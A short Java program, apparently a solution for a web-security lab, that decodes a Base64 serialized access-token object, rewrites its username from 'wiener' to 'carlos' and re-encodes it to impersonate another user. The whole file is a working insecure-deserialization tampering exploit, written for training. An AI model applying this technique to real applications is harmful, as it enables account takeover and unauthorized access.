package br.pgmf.burp;

import lab.actions.common.serializable.AccessTokenUser;

import java.io.*;
import java.util.Base64;

public class RevertSerialization {

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        String base64String = "rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBvc3JtMnEwcnFrOTFnNWRicWxlM2UzNHRweGNvb3JjcHQABndpZW5lcg==";
        byte[] bytes = Base64.getDecoder().decode(base64String);
        InputStream is = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(is);
        AccessTokenUser acme = (AccessTokenUser)ois.readObject();
        acme.setUsername("carlos");

        ByteArrayOutputStream out  = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(out);
        oos.writeObject(acme);
        oos.flush();
        base64String  = Base64.getEncoder().encodeToString(out.toByteArray());
        System.out.println(base64String);
    }
}